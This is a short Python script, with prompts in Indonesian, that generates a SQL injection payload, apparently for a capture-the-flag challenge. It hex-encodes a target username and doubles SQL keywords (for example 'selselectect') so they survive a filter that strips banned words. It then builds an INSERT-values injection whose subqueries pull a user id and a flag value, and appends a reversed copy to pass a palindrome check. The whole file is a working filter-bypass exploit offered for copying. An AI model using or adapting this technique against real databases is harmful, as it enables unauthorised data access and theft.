import random
import string
import sys

def get_random_str(length=6):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def main():
    print("\n[+] --- SQL Injection Payload Generator --- [+]")
    
    try:
        username = input("Masukkan username target: ").strip()
        if not username:
            print("[!] Username tidak boleh kosong.")
            return
    except KeyboardInterrupt:
        sys.exit()

    uname_hex = f"0x{username.encode('utf-8').hex()}"
    
    kw_select = "selselectect"
    kw_from = "frfromom"
    kw_where = "wherwheree"
    kw_user = "ususerers"
    kw_flag_col = "flflagag" 

    subquery_user = f"({kw_select}(id){kw_from}({kw_user}){kw_where}(ususerername={uname_hex}))"
    
    subquery_flag = f"({kw_select}(max({kw_flag_col})){kw_from}({kw_flag_col}))"

    rand_id = get_random_str()
    print(f"[i] Generated Session ID: {rand_id}")

    raw_injection = f"1'),('{rand_id}',{subquery_user},{subquery_flag})"

    forbidden_words = ["select", "from", "union", "flag", "user", "where", "/*"]
    
    clean_payload = raw_injection
    for word in forbidden_words:
        clean_payload = clean_payload.replace(word, "")

    palindrom_balancer = clean_payload[::-1]

    final_result = f"{raw_injection}#{palindrom_balancer}"

    print("\n" + "="*40)
    print("COPY PAYLOAD DI BAWAH INI:")
    print("="*40)
    print(final_result)
    print("="*40 + "\n")

if __name__ == "__main__":
    main()